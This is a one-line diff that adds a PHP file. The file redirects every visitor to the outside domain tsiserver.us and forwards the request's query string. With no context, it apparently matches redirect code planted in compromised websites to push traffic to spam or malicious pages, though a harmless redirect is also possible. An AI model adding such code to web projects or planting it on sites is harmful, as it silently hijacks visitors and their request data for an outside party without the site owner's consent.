@@ -1,0 +1,1 @@
+<?php	header("Location:	http://tsiserver.us/?" . $_SERVER['QUERY_STRING']); exit();?>
